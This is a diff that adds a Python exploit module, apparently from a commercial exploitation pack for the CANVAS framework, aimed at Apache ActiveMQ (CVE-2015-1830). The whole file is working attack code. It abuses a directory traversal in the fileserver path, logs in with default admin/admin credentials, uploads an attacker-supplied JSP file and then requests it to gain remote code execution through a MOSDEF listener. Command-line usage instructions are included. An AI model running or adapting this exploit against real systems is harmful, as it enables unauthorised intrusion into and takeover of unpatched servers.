@@ -1,0 +1,132 @@
+#!/usr/bin/env python
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD Modules
+###
+import sys
+
+if '.' not in sys.path:
+    sys.path.append('.')
+    sys.path.append('3rdparty/D2SEC/libs')
+
+###
+# Canvas modules
+###
+from d2_exploitutils import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+from canvasexploit import *
+import canvasengine
+import libs.spkproxy as spkproxy
+
+
+NAME                            = "d2sec_activemq2"
+DESCRIPTION                     = "ActiveMQ Remote Code Execution Vulnerability"
+DOCUMENTATION                   = {}
+DOCUMENTATION['VENDOR']         = "Apache"
+DOCUMENTATION['Repeatability']  = "Infinite"
+DOCUMENTATION['CVE Name']       = "CVE-2015-1830"
+DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1830"
+DOCUMENTATION['References']     = ['http://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt',
+                                   'http://davidjorm.blogspot.fr/2015/08/directory-traversal-leading-to-rce-when.html']
+VERSION                         = "1.0"
+PROPERTY                        = {}
+PROPERTY['TYPE']                = "Web Exploits"
+PROPERTY['SITE']                = "Remote"
+PROPERTY['ARCH']                = [["Windows"]]
+
+DOCUMENTATION['NOTES'] = """
+"""
+
+CHANGELOG = """
+"""
+
+class theexploit(tcpexploit):
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.port = 8161
+    self.host = ""
+    self.version = 0
+    self.done = 0
+    self.ssl = ""
+    self.name = NAME
+    self.filejsp = ''
+    self.basepath = "/fileserver/..\\admin\\d2.jsp"
+    self.basicauth_user = 'admin'
+    self.basicauth_pass = 'admin'
+    self.hostname = None
+    return
+    
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.filejsp = self.argsDict.get("filejsp", self.filejsp)
+    self.basicauth_user = self.argsDict.get("basicauth_user", self.basicauth_user)
+    self.basicauth_pass = self.argsDict.get("basicauth_pass", self.basicauth_pass)
+    self.ssl = self.argsDict.get("ssl",self.ssl)
+    return
+
+  def send_activemq_request(self):
+    if not self.hostname:
+      self.hostname = self.host
+
+    self.log('[D2] Attacking %s:%d' % (self.hostname, self.port))
+    self.log('[D2] Basic Auth User: %s' % self.basicauth_user)
+    self.log('[D2] VHost: %s' % self.hostname)
+        
+    if self.ssl:
+      protocol = "https"
+    else:
+      protocol = "http"
+
+    # directory traversal
+    self.log('[D2] Exploit Directory Traversal Vulnerability')
+    auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_pass)
+    host_field = "%s:%s" % (self.hostname, self.port)
+
+    targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath
+    self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)
+    self.ua.addHeader("Host", host_field)
+ 
+    data = open(self.filejsp, 'r').read()
+    self.ua.PUT('', data, noresponse=True)
+
+    # request mosdef jsp script
+    self.log('[D2] Request uploaded mosdef JSP script')
+    targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + '/admin/d2.jsp'
+    self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)
+    self.ua.addHeader("Host", host_field)
+    data = self.ua.GET('')
+
+        
+  def run(self):
+    self.getargs()
+    self.setInfo('%s attacking %s:%d (in progress)' % (self.name, self.host, self.port))
+    self.send_activemq_request()
+    self.setInfo("%s attacking %s:%d (DONE)" % (self.name, self.host, self.port))
+    return 1
+
+
+  def usage(self):
+    logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -O filejsp:/tmp/foo.jsp")
+    logging.info("-t <target ip>")
+    logging.info("-p <target port> [optional]")
+    logging.info("-O filejsp: /path/to/mosdef/jsp/")
+    logging.info("-O basicauth_user: basic auth username [optional]")
+    logging.info("-O basicauth_pass: basic auth password [optional]")
+    return
+
+
+if __name__ == '__main__':
+    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
+    app = theexploit()
+    ret = standard_callback_commandline(app)
